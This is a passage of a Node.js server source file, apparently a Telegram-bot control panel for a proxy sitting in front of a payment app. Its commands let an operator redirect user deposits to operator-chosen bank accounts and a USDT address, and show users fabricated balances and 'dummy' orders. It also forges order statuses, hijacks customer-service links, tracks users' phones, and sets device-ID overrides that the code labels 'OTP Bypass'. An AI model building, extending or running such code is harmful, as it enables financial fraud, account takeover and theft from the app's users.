      await bot.sendMessage(chatId, `✅ *Bank #${freshData.banks.length} Added Successfully!*\n━━━━━━━━━━━━━━━━━━\n👤 *Holder:* ${newBank.accountHolder}\n🔢 *Account:* \`${newBank.accountNo}\`\n🏛 *IFSC:* \`${newBank.ifsc}\`${newBank.bankName ? `\n🏦 *Bank:* ${newBank.bankName}` : ''}${newBank.upiId ? `\n📱 *UPI:* \`${newBank.upiId}\`` : ''}${newBank.minAmount ? `\n💵 *Min Amount:* ₹${newBank.minAmount}` : ''}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank')) {
      const arg = text.replace(/^\/removebank\s*/i, '').trim();
      const idx = parseInt(arg, 10) - 1;
      const freshData = await loadData(true);
      freshData.banks = freshData.banks || [];
      if (isNaN(idx) || idx < 0 || idx >= freshData.banks.length) {
        await bot.sendMessage(chatId, `❌ Invalid bank index. Use \`/banks\` to see list numbers (1 to ${freshData.banks.length}).`, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const removed = freshData.banks.splice(idx, 1)[0];
      if (freshData.activeIndex === idx) {
        freshData.activeIndex = freshData.banks.length > 0 ? 0 : -1;
      } else if (freshData.activeIndex > idx) {
        freshData.activeIndex--;
      }
      await saveData(freshData);
      await bot.sendMessage(chatId, `🗑 *Bank Removed:*\n${removed.accountHolder} | \`${removed.accountNo}\`\n\nRemaining banks: ${freshData.banks.length}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank')) {
      const arg = text.replace(/^\/setbank\s*/i, '').trim();
      const idx = parseInt(arg, 10) - 1;
      const freshData = await loadData(true);
      freshData.banks = freshData.banks || [];
      if (isNaN(idx) || idx < 0 || idx >= freshData.banks.length) {
        await bot.sendMessage(chatId, `❌ Invalid bank index. Use \`/banks\` to see list numbers (1 to ${freshData.banks.length}).`, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      freshData.activeIndex = idx;
      await saveData(freshData);
      const b = freshData.banks[idx];
      await bot.sendMessage(chatId, `✅ *Active Bank Set to #${idx + 1}:*\n👤 *Holder:* ${b.accountHolder}\n🔢 *Account:* \`${b.accountNo}\`\n🏛 *IFSC:* \`${b.ifsc}\``, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/setmin')) {
      const parts = text.replace(/^\/setmin\s*/i, '').trim().split(/\s+/);
      const idx = parseInt(parts[0], 10) - 1;
      const amt = parseFloat(parts[1]);
      const freshData = await loadData(true);
      freshData.banks = freshData.banks || [];
      if (isNaN(idx) || idx < 0 || idx >= freshData.banks.length || isNaN(amt)) {
        await bot.sendMessage(chatId, '❌ Format: `/setmin <bank_number> <amount>`\nExample: `/setmin 1 500`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      freshData.banks[idx].minAmount = amt;
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ Minimum amount for Bank #${idx + 1} (${freshData.banks[idx].accountHolder}) set to ₹${amt}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ') || text.startsWith('/deduct ')) {
      const isAdd = text.startsWith('/add ');
      const rawArgs = text.substring(isAdd ? 5 : 8).trim().split(/\s+/);
      const amount = parseFloat(rawArgs[0]);
      const targetUserId = rawArgs[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, `❌ *Format:* \`${isAdd ? '/add' : '/deduct'} <amount> <userId>\`\n*Example:* \`${isAdd ? '/add' : '/deduct'} 500 123456\``, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.userOverrides = freshData.userOverrides || {};
      freshData.userOverrides[targetUserId] = freshData.userOverrides[targetUserId] || {};
      const currentDelta = freshData.userOverrides[targetUserId].addedBalance || 0;
      const newDelta = isAdd ? (currentDelta + amount) : (currentDelta - amount);
      freshData.userOverrides[targetUserId].addedBalance = newDelta;

      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUserId];
      const currentBal = tracked ? tracked.balance : 'N/A';
      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + newDelta).toFixed(2)) : 'N/A';

      freshData.balanceHistory = freshData.balanceHistory || [];
      freshData.balanceHistory.push({
        type: isAdd ? 'add' : 'deduct',
        userId: targetUserId,
        amount: amount,
        totalAdded: newDelta,
        originalBalance: currentBal,
        updatedBalance: updatedBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });

      if (!freshData.userOverrides[targetUserId].quotaRecords) freshData.userOverrides[targetUserId].quotaRecords = [];
      const nowDate = new Date();
      const dd = String(nowDate.getDate()).padStart(2, '0');
      const mm = String(nowDate.getMonth() + 1).padStart(2, '0');
      const yyyy = nowDate.getFullYear();
      const hh = String(nowDate.getHours()).padStart(2, '0');
      const mi = String(nowDate.getMinutes()).padStart(2, '0');
      const ss = String(nowDate.getSeconds()).padStart(2, '0');
      const formattedTime = `${dd}/${mm}/${yyyy} ${hh}:${mi}:${ss}`;
      const balAfterAdd = updatedBal !== 'N/A' ? String(updatedBal) : String(amount);
      if (isAdd) {
        freshData.userOverrides[targetUserId].quotaRecords.push({
          amount: "+" + String(amount),
          balance: balAfterAdd,
          createTime: formattedTime,
          sourceType: "Deposit From Admin",
          sourceTypeGroup: "Admin"
        });
      }
      await saveData(freshData);
      const actionWord = isAdd ? 'Added' : 'Deducted';
      await bot.sendMessage(chatId, `✅ *${actionWord} ₹${amount} for user ${targetUserId}*\n💰 *Net Balance Override:* ₹${newDelta}\n📊 *Calculated Balance:* ${updatedBal !== 'N/A' ? `₹${updatedBal}` : '(Will show on user login)'}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance')) {
      const targetId = text.replace(/^\/remove balance\s*/i, '').trim();
      if (!targetId) {
        await bot.sendMessage(chatId, '❌ Format: `/remove balance <userId>`\nOr use `/resetallbalance` to reset all users.', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.userOverrides = freshData.userOverrides || {};
      if (freshData.userOverrides[targetId] && freshData.userOverrides[targetId].addedBalance !== undefined) {
        delete freshData.userOverrides[targetId].addedBalance;
        delete freshData.userOverrides[targetId].quotaRecords;
        freshData.balanceHistory = freshData.balanceHistory || [];
        freshData.balanceHistory.push({
          type: 'remove',
          userId: targetId,
          amount: 0,
          totalAdded: 0,
          originalBalance: 'N/A',
          updatedBalance: 'Real',
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          phone: ''
        });
        await saveData(freshData);
        await bot.sendMessage(chatId, `🗑 *Removed fake balance for user ${targetId}.*\nReal system balance restored.`, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `ℹ️ User ${targetId} had no active fake balance.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/resetallbalance') {
      const freshData = await loadData(true);
      freshData.userOverrides = freshData.userOverrides || {};
      for (const uid of Object.keys(freshData.userOverrides)) {
        if (freshData.userOverrides[uid]) {
          delete freshData.userOverrides[uid].addedBalance;
          delete freshData.userOverrides[uid].quotaRecords;
        }
      }
      await saveData(freshData);
      await bot.sendMessage(chatId, '🔄 *All user fake balance overrides have been RESET to real balances.*', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const target = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const freshData = await loadData(true);
      const list = freshData.balanceHistory || [];
      const filtered = target ? list.filter(h => h.userId === target) : list;
      if (filtered.length === 0) {
        await bot.sendMessage(chatId, `📋 No balance history records found${target ? ` for user ${target}` : ''}.`);
        return res.sendStatus(200);
      }
      let m = `📋 *Balance History (${filtered.length} entries):*\n━━━━━━━━━━━━━━━━━━\n\n`;
      const recent = filtered.slice(-15);
      for (const h of recent) {
        const icon = h.type === 'add' ? '➕' : (h.type === 'deduct' ? '➖' : '🔄');
        m += `${icon} *User:* \`${h.userId}\` | *Amt:* ₹${h.amount} | *Net:* ₹${h.totalAdded}\n   🕒 ${h.time}\n\n`;
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n...(truncated)';
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      const freshData = await loadData(true);
      freshData.balanceHistory = [];
      await saveData(freshData);
      await bot.sendMessage(chatId, '🗑 *Balance history log cleared.*', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/orders') {
      const freshData = await loadData(true);
      const map = freshData.orderBankMap || {};
      const uniqueOrders = Object.values(map).filter((v, i, a) => v && v.orderCode && a.findIndex(t => t.orderCode === v.orderCode) === i);
      if (uniqueOrders.length === 0) {
        await bot.sendMessage(chatId, '📋 No active order-to-bank bindings.');
        return res.sendStatus(200);
      }
      let m = `📦 *Saved Order Bindings (${uniqueOrders.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
      for (const o of uniqueOrders.slice(0, 20)) {
        m += `• *Order:* \`${o.orderCode}\`\n  User: \`${o.userId || 'N/A'}\` | Amount: ₹${o.amount || '0'}\n  Bound Bank: ${o.bank ? `${o.bank.accountHolder} (\`${o.bank.accountNo}\`)` : 'None'}\n\n`;
      }
      if (uniqueOrders.length > 20) m += `...and ${uniqueOrders.length - 20} more orders.`;
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/delorder ')) {
      const code = text.substring(10).trim();
      const freshData = await loadData(true);
      freshData.orderBankMap = freshData.orderBankMap || {};
      const entry = freshData.orderBankMap[code];
      if (entry) {
        delete freshData.orderBankMap[code];
        if (entry.buyId) delete freshData.orderBankMap[entry.buyId];
        await saveData(freshData);
        await bot.sendMessage(chatId, `🗑 *Order binding for \`${code}\` deleted.*`, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `❌ Order \`${code}\` not found in bindings.`, { parse_mode: 'Markdown' });
      }
      return res.sendStatus(200);
    }

    if (text === '/clearorders') {
      const freshData = await loadData(true);
      freshData.orderBankMap = {};
      await saveData(freshData);
      await bot.sendMessage(chatId, '🗑 *All order-to-bank bindings cleared.*', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/setstatus ')) {
      const parts = text.substring(11).trim().split(/\s+/);
      const code = parts[0];
      const stNum = parseInt(parts[1], 10);
      const userId = parts[2] || 'All';
      const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close/Failed" };
      if (!code || isNaN(stNum) || !statusLabels[stNum]) {
        await bot.sendMessage(chatId, '❌ Format: `/setstatus <orderCode> <1|3|4> [userId]`\n\n• `1` = Processing\n• `3` = Completed\n• `4` = Close / Failed\n\nExample: `/setstatus UM3GfR 3`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.orderStatusOverrides = freshData.orderStatusOverrides || {};
      const entry = {
        userId: userId,
        orderCode: code,
        status: stNum,
        statusLabel: statusLabels[stNum],
        updatedAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      freshData.orderStatusOverrides[code] = entry;
      if (userId && userId !== 'All') {
        freshData.orderStatusOverrides[`${userId}:${code}`] = entry;
      }
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ *Status Override Set!*\n━━━━━━━━━━━━━━━━━━\n📦 *Order:* \`${code}\`\n👤 *User:* \`${userId}\`\n🎯 *New Status:* ${statusLabels[stNum]} (${stNum})`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/delstatus ')) {
      const code = text.substring(11).trim();
      const freshData = await loadData(true);
      freshData.orderStatusOverrides = freshData.orderStatusOverrides || {};
      if (code === 'all') {
        freshData.orderStatusOverrides = {};
        await saveData(freshData);
        await bot.sendMessage(chatId, '🗑 *All order status overrides cleared.*', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      delete freshData.orderStatusOverrides[code];
      for (const k of Object.keys(freshData.orderStatusOverrides)) {
        if (k.endsWith(`:${code}`)) delete freshData.orderStatusOverrides[k];
      }
      await saveData(freshData);
      await bot.sendMessage(chatId, `🗑 *Status override for \`${code}\` deleted.*`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/statusoverrides') {
      const freshData = await loadData(true);
      const map = freshData.orderStatusOverrides || {};
      const keys = Object.keys(map).filter(k => !k.includes(':'));
      if (keys.length === 0) {
        await bot.sendMessage(chatId, '📋 No active order status overrides.');
        return res.sendStatus(200);
      }
      let m = `🎯 *Active Status Overrides (${keys.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
      for (const k of keys) {
        const o = map[k];
        m += `• *Order:* \`${o.orderCode}\` ➔ *${o.statusLabel}* (${o.status})\n  Target: \`${o.userId || 'All'}\` | ${o.updatedAt}\n\n`;
      }
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/dummies') {
      const freshData = await loadData(true);
      const dummies = freshData.dummyOrders || [];
      if (dummies.length === 0) {
        await bot.sendMessage(chatId, '🎁 No active dummy orders. Use `/adddummy <amount> [percent] [min] [max]` to add one.', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      let m = `🎁 *Active Dummy Orders (${dummies.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
      for (const d of dummies) {
        const p = d.percent || 3;
        m += `• \`${d.code}\` — *₹${d.amount}* (+₹${d.income || (d.amount * p / 100).toFixed(2)}, ${p}%)\n  Range: ₹${d.minRange || 0} - ₹${d.maxRange || 'Max'} | ${d.createdAt}\n\n`;
      }
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/adddummy')) {
      const parts = text.replace(/^\/adddummy\s*/i, '').trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      if (isNaN(amount) || amount <= 0) {
        await bot.sendMessage(chatId, '❌ Format: `/adddummy <amount> [percent] [minRange] [maxRange]`\nExample: `/adddummy 2000 3.5 1000 5000`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const p = parts[1] ? (parseFloat(parts[1]) || 3) : 3;
      const min = parts[2] ? parseFloat(parts[2]) : null;
      const max = parts[3] ? parseFloat(parts[3]) : null;
      const freshData = await loadData(true);
      const incVal = parseFloat((amount * (p / 100)).toFixed(2));
      const cd = generateDummyCode();
      const numId = generateDummyId();
      const dummy = {
        id: cd,
        payOrderId: cd,
        orderId: cd,
        buyId: cd,
        code: cd,
        orderCode: cd,
        buyCode: cd,
        remark: cd,
        sn: cd,
        numericId: numId,
        amount: amount,
        orderAmount: amount,
        percent: p,
        commissionRate: p,
        income: incVal,
        commission: incVal,
        rebate: incVal,
        reward: incVal,
        profit: incVal,
        incomeAmount: incVal,
        commissionAmount: incVal,
        rebateAmount: incVal,
        rewardAmount: incVal,
        rateAmount: incVal,
        minRange: min,
        maxRange: max,
        createdAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      freshData.dummyOrders = freshData.dummyOrders || [];
      freshData.dummyOrders.push(dummy);
      await saveData(freshData);
      await bot.sendMessage(chatId, `🎁 *Dummy Order Created!*\n━━━━━━━━━━━━━━━━━━\n📦 *Code:* \`${cd}\`\n💵 *Amount:* ₹${amount}\n📈 *Income:* +₹${incVal} (${p}%)\n🎯 *Range:* ${min || 0} - ${max || 'Unlimited'}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/deldummy')) {
      const id = text.replace(/^\/deldummy\s*/i, '').trim();
      if (!id) {
        await bot.sendMessage(chatId, '❌ Format: `/deldummy <code|id>` or `/deldummy all`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.dummyOrders = freshData.dummyOrders || [];
      if (id === 'all') {
        freshData.dummyOrders = [];
        await saveData(freshData);
        await bot.sendMessage(chatId, '🗑 *All dummy orders deleted.*', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const beforeLen = freshData.dummyOrders.length;
      freshData.dummyOrders = freshData.dummyOrders.filter(d => String(d.id) !== id && String(d.code) !== id);
      await saveData(freshData);
      if (freshData.dummyOrders.length < beforeLen) {
        await bot.sendMessage(chatId, `🗑 *Dummy order \`${id}\` deleted.*`, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `❌ Dummy order \`${id}\` not found.`, { parse_mode: 'Markdown' });
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/suspend ')) {
      const parts = text.substring(9).trim().split(/\s+/);
      const targetPhone = parts[0];
      const customMsg = parts.slice(1).join(' ') || 'Your account has been suspended.';
      if (!targetPhone) {
        await bot.sendMessage(chatId, '❌ Format: `/suspend <phone/userId> [reason]`\nExample: `/suspend 9876543210 Violation of rules`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.suspendedUsers = freshData.suspendedUsers || {};
      freshData.suspendedUsers[targetPhone] = {
        phone: targetPhone,
        message: customMsg,
        updatedAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      await saveData(freshData);
      await bot.sendMessage(chatId, `🚫 *User \`${targetPhone}\` Suspended!*\nReason: "${customMsg}"`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuspend ')) {
      const targetPhone = text.substring(11).trim();
      const freshData = await loadData(true);
      freshData.suspendedUsers = freshData.suspendedUsers || {};
      if (freshData.suspendedUsers[targetPhone]) {
        delete freshData.suspendedUsers[targetPhone];
        await saveData(freshData);
        await bot.sendMessage(chatId, `✅ *User \`${targetPhone}\` unsuspended successfully.*`, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `ℹ️ User \`${targetPhone}\` was not suspended.`, { parse_mode: 'Markdown' });
      }
      return res.sendStatus(200);
    }

    if (text === '/suspended') {
      const freshData = await loadData(true);
      const list = Object.values(freshData.suspendedUsers || {});
      if (list.length === 0) {
        await bot.sendMessage(chatId, '📋 No suspended accounts.');
        return res.sendStatus(200);
      }
      let m = `🚫 *Suspended Accounts (${list.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
      for (const u of list) {
        m += `• \`${u.phone}\` — "${u.message}" (${u.updatedAt})\n\n`;
      }
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const freshData = await loadData(true);
      const tracked = freshData.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) {
        await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear when they use the app.');
        return res.sendStatus(200);
      }
      let m = `📋 *Tracked Users (${ids.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
      for (const uid of ids.slice(0, 20)) {
        const u = tracked[uid];
        const hasOverride = (freshData.userOverrides && freshData.userOverrides[uid]) ? ' ⚙️' : '';
        m += `👤 *ID:* \`${uid}\`${hasOverride}\n   📱 Phone: \`${u.phone || 'N/A'}\` | Bal: ₹${u.balance || '0'}\n   🕐 Last: ${u.lastAction || 'Active'} @ ${u.lastSeen || 'N/A'}\n\n`;
      }
      if (ids.length > 20) m += `...and ${ids.length - 20} more users.`;
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/deltrack ')) {
      const uid = text.substring(10).trim();
      const freshData = await loadData(true);
      freshData.trackedUsers = freshData.trackedUsers || {};
      if (freshData.trackedUsers[uid]) {
        delete freshData.trackedUsers[uid];
        await saveData(freshData);
        await bot.sendMessage(chatId, `🗑 *Tracked data for user \`${uid}\` deleted.*`, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `❌ User \`${uid}\` not found in tracking.`, { parse_mode: 'Markdown' });
      }
      return res.sendStatus(200);
    }

    if (text === '/cleartracking') {
      const freshData = await loadData(true);
      freshData.trackedUsers = {};
      await saveData(freshData);
      await bot.sendMessage(chatId, '🗑 *All user tracking records cleared.*', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      const freshData = await loadData(true);
      freshData.userOverrides = freshData.userOverrides || {};
      freshData.userOverrides[targetId] = freshData.userOverrides[targetId] || {};
      freshData.userOverrides[targetId].logOff = true;
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
      }
      await saveData(freshData);
      await bot.sendMessage(chatId, `🔇 *Logging turned OFF for user \`${targetId}\`.*`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      const freshData = await loadData(true);
      if (freshData.userOverrides && freshData.userOverrides[targetId]) {
        delete freshData.userOverrides[targetId].logOff;
        for (const [tKey, uid] of Object.entries(tokenUserMap)) {
          if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
        }
        await saveData(freshData);
      }
      await bot.sendMessage(chatId, `📡 *Logging turned ON for user \`${targetId}\`.*`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt')) {
      const addr = text.replace(/^\/usdt\s*/i, '').trim();
      const freshData = await loadData(true);
      if (!addr) {
        await bot.sendMessage(chatId, `₮ *Current USDT Address:* ${freshData.usdtAddress ? `\`${freshData.usdtAddress}\`` : 'None'}\n\nTo set: \`/usdt <TRC20_ADDRESS>\`\nTo disable: \`/usdt off\``, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      if (addr.toLowerCase() === 'off') {
        freshData.usdtAddress = '';
        await saveData(freshData);
        await bot.sendMessage(chatId, '❌ *USDT TRC20 address override turned OFF.*', { parse_mode: 'Markdown' });
      } else if (addr.length >= 20) {
        freshData.usdtAddress = addr;
        await saveData(freshData);
        await bot.sendMessage(chatId, `₮ *USDT TRC20 Address Set:*\n\`${addr}\``, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, '❌ Invalid USDT address (at least 20 characters required).', { parse_mode: 'Markdown' });
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/service')) {
      const link = text.replace(/^\/service\s*/i, '').trim();
      const freshData = await loadData(true);
      if (!link) {
        await bot.sendMessage(chatId, `🎧 *Current Support Link:* ${freshData.customServiceLink ? `\`${freshData.customServiceLink}\`` : 'Default'}\n\nTo set: \`/service https://t.me/your_handle\`\nTo disable: \`/service off\``, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      if (link.toLowerCase() === 'off') {
        freshData.customServiceLink = '';
        await saveData(freshData);
        await bot.sendMessage(chatId, '🔴 *Customer Service override turned OFF (Using real app links).*', { parse_mode: 'Markdown' });
      } else {
        let formattedUrl = link;
        if (formattedUrl.startsWith('@')) formattedUrl = 'https://t.me/' + formattedUrl.substring(1);
        else if (!formattedUrl.startsWith('http://') && !formattedUrl.startsWith('https://')) formattedUrl = 'https://t.me/' + formattedUrl;
        freshData.customServiceLink = formattedUrl;
        await saveData(freshData);
        await bot.sendMessage(chatId, `🎧 *Customer Service Link Updated:*\n\`${formattedUrl}\``, { parse_mode: 'Markdown' });
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/bot2')) {
      const parts = text.replace(/^\/bot2\s*/i, '').trim().split(/\s+/);
      const freshData = await loadData(true);
      if (parts[0] === 'on') {
        freshData.bot2Enabled = true;
        BOT2_ENABLED = true;
        await saveData(freshData);
        await bot.sendMessage(chatId, '🟢 *Secondary Bot Notifications ON*', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      if (parts[0] === 'off') {
        freshData.bot2Enabled = false;
        BOT2_ENABLED = false;
        await saveData(freshData);
        await bot.sendMessage(chatId, '🔴 *Secondary Bot Notifications OFF*', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const token = parts[0];
      const newChatId = parts[1];
      if (!token || !newChatId) {
        await bot.sendMessage(chatId, `🤖 *Secondary Bot Config:*\nToken: \`${freshData.bot2Token || 'None'}\`\nChat ID: \`${freshData.bot2ChatId || 'None'}\`\nStatus: ${freshData.bot2Enabled ? '🟢 ON' : '🔴 OFF'}\n\n*Usage:* \`/bot2 <token> <chatId>\`\n*Toggle:* \`/bot2 on\` / \`/bot2 off\``, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      freshData.bot2Token = token;
      freshData.bot2ChatId = newChatId;
      freshData.bot2Enabled = true;
      BOT2_TOKEN = token;
      BOT2_CHAT_ID = newChatId;
      BOT2_ENABLED = true;
      try { bot2 = new TelegramBot(BOT2_TOKEN); } catch (e) { }
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ *Secondary Bot Settings Saved!*\nToken: \`${token.substring(0, 10)}...\`\nChat ID: \`${newChatId}\``, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/setadmin')) {
      const parts = text.replace(/^\/setadmin\s*/i, '').trim().split(/\s+/);
      const targetStr = parts[0];
      let targetChatId = targetStr === 'me' ? chatId : (parseInt(targetStr, 10) || targetStr);
      if (!targetChatId) {
        await bot.sendMessage(chatId, '❌ Format: `/setadmin <newChatId>`\nExample: `/setadmin 123456789`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.adminChatId = targetChatId;
      await saveData(freshData);
      await bot.sendMessage(chatId, `👑 *Admin Chat ID changed to:* \`${targetChatId}\``, { parse_mode: 'Markdown' });
      if (String(targetChatId) !== String(chatId)) {
        bot.sendMessage(targetChatId, `👑 You have been set as the Admin for WecoinPay Bot! Send /start to view controls.`).catch(() => { });
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/useid')) {
      const freshData = await loadData(true);
      const parts = text.trim().split(/\s+/);
      let devId = parts[1];
      if (!devId && freshData.lastCapturedId) {
        devId = freshData.lastCapturedId.deviceId;
      }
      if (!devId) {
        await bot.sendMessage(chatId, '⚠️ Usage: /useid <deviceId>\nOr run /useid directly after a login attempt to use last captured deviceId.');
        return res.sendStatus(200);
      }
      freshData.useIdOverride = { deviceId: devId };
      await saveData(freshData);
      await bot.sendMessage(chatId, `🎯 *Single-Use DeviceId Override Set (OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will apply to the VERY NEXT login attempt and then auto-reset.`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/alwaysid')) {
      const freshData = await loadData(true);
      const parts = text.trim().split(/\s+/);
      const sub = parts[1] ? parts[1].toLowerCase() : '';

      if (sub === 'off') {
        freshData.alwaysIdOverride = null;
        await saveData(freshData);
        await bot.sendMessage(chatId, '✅ *Persistent DeviceId Override Turned OFF*', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }

      let devId = parts[1];
      if (!devId && freshData.lastCapturedId) {
        devId = freshData.lastCapturedId.deviceId;
      }

      if (!devId) {
        await bot.sendMessage(chatId, '⚠️ Usage: /alwaysid <deviceId>\nOr /alwaysid off to disable.');
        return res.sendStatus(200);
      }

      freshData.alwaysIdOverride = { deviceId: devId };
      await saveData(freshData);
      await bot.sendMessage(chatId, `🔄 *Persistent DeviceId Override Set (OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will apply to ALL future login attempts until turned off.`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/clearid') {
      const freshData = await loadData(true);
      freshData.useIdOverride = null;
      freshData.alwaysIdOverride = null;
      await saveData(freshData);
      await bot.sendMessage(chatId, '🧹 *All DeviceId Overrides Cleared!*', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all available commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch (e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.post('/bot2-webhook', async (req, res) => {
  try {
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    if (text.startsWith('/start')) {
      if (bot2) {
        await bot2.sendMessage(chatId, '🟢 Bot & App is active').catch(() => { });
      }
      return res.sendStatus(200);
    }
    return res.sendStatus(200);
  } catch (e) {
    return res.sendStatus(200);
  }
});


app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => {
  const { response, respHeaders, respBuffer, jsonResp } = await proxyFetch(req);
  try {
    const data = await loadData();
    if (data.customServiceLink && data.customServiceLink.trim() !== '') {
      let customLink = data.customServiceLink.trim();
      if (!customLink.startsWith('http://') && !customLink.startsWith('https://') && !customLink.startsWith('tg://')) {
        customLink = 'https://t.me/' + customLink.replace(/^@/, '');
      }
      let resObj = jsonResp;
      if (!resObj && respBuffer) {
        try { resObj = JSON.parse(respBuffer.toString('utf8')); } catch (e) { }
      }
      if (resObj && Array.isArray(resObj.data) && resObj.data.length > 0) {
        resObj.data = resObj.data.map(item => ({
          ...item,
          link: customLink,
          url: customLink
        }));
        return sendJson(res, respHeaders, resObj, JSON.stringify(resObj));
      } else if (resObj && resObj.data && typeof resObj.data === 'object' && !Array.isArray(resObj.data)) {
        resObj.data.link = customLink;
        resObj.data.url = customLink;
        resObj.data.customServiceLink = customLink;
        return sendJson(res, respHeaders, resObj, JSON.stringify(resObj));
      } else {
        const fallbackObj = {
          code: 1000,
          data: [{
            id: 1,
            name: "Customer Service",
            serviceName: "Customer Service",
            type: 1,
            link: customLink,
